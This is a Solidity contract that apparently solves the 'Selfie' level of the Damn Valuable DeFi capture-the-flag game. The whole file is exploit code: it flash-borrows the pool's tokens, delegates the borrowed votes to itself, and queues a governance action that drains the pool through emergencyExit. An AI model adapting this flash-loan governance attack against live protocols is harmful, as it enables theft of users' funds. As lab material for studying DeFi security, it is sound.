// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieHack is IERC3156FlashBorrower {
    DamnValuableVotes token;
    ISimpleGovernance gov;
    SelfiePool pool;
    address recovery;
    uint256 public actionId;

    constructor(
        address _token,
        address _gov,
        address _pool,
        address _recovery
    ) {
        token = DamnValuableVotes(_token);
        gov = ISimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        recovery = _recovery;
    }

    function startFlashloan() external {
        // get flash loan of more than half of the tokens
        pool.flashLoan(
            this,
            address(token),
            token.balanceOf(address(pool)),
            "0x"
        );
    }

    function onFlashLoan(
        address initiator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        require(initiator == address(this), "did not initiate this");

        // create governance action
        bytes memory action = abi.encodeWithSignature("emergencyExit(address)", recovery);

        // delegate to self so the votes count in gov
        token.delegate(address(this));

        actionId = gov.queueAction(address(pool), 0, action);

        token.approve(address(pool), type(uint256).max);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
